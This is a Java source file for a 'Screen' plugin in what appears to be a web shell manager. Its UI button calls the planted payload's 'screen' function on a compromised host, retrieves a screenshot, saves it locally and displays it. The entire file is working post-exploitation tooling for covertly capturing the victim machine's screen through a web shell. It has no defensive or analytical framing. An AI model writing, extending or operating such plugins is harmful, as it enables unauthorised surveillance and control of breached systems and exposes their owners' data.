package shells.plugins.java;

import core.Encoding;
import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import java.awt.BorderLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ComponentAdapter;
import java.awt.event.ComponentEvent;
import java.io.ByteArrayInputStream;
import java.io.File;
import java.io.FileOutputStream;
import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import util.Log;
import util.automaticBindClick;
import util.http.ReqParameter;

@PluginAnnotation(Name = "Screen", payloadName = "JavaDynamicPayload")
public class Screen implements Plugin {
    private Encoding encoding;
    private JLabel label;
    private JPanel panel = new JPanel(new BorderLayout());
    private Payload payload;
    private JButton runButton = new JButton("screen");
    private ShellEntity shellEntity;
    private JSplitPane splitPane = new JSplitPane();

    public Screen() {
        this.splitPane.setOrientation(0);
        this.splitPane.setDividerSize(0);
        JPanel topPanel = new JPanel();
        topPanel.add(this.runButton);
        this.label = new JLabel(new ImageIcon());
        this.splitPane.setTopComponent(topPanel);
        this.splitPane.setBottomComponent(new JScrollPane(this.label));
        this.splitPane.addComponentListener(new ComponentAdapter() {
             

            public void componentResized(ComponentEvent e) {
                Screen.this.splitPane.setDividerLocation(0.15d);
            }
        });
        this.panel.add(this.splitPane);
    }

    private void runButtonClick(ActionEvent actionEvent) {
        byte[] result = this.payload.evalFunc(null, "screen", new ReqParameter());
        try {
            if (result.length < 100) {
                Log.error(this.encoding.Decoding(result));
            }
            JFileChooser chooser = new JFileChooser();
            chooser.setFileSelectionMode(0);
            chooser.showDialog(new JLabel(), "选择");
            File selectdFile = chooser.getSelectedFile();
            if (selectdFile != null) {
                FileOutputStream fileOutputStream = new FileOutputStream(selectdFile);
                fileOutputStream.write(result);
                fileOutputStream.close();
                JOptionPane.showMessageDialog(this.panel, String.format("save screen to -> %s", selectdFile.getAbsolutePath()), "提示", 1);
            }
            this.label.setIcon(new ImageIcon(ImageIO.read(new ByteArrayInputStream(result))));
        } catch (Exception e) {
            Log.error(e);
        }
    }

    @Override 
    public void init(ShellEntity shellEntity2) {
        this.shellEntity = shellEntity2;
        this.payload = this.shellEntity.getPayloadModel();
        this.encoding = Encoding.getEncoding(this.shellEntity);
        automaticBindClick.bindJButtonClick(this, this);
    }

    @Override 
    public JPanel getView() {
        return this.panel;
    }
}
